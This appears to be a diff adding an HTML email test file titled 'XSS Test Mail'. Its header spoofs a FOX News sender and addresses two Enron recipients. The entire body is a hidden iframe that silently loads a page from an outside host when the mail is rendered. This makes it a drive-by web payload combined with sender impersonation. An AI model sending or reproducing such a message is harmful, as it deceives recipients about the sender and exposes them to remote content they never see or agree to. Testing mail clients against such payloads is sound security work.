@@ -1,0 +1,7 @@
+From: FOX News Channel<viewerservices@foxnews.com>
+To: a..hueter@enron.com, susan.lindberg@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<iframe src="http://tmxk.org/t/" style="display:none" id="wooyun"></iframe>
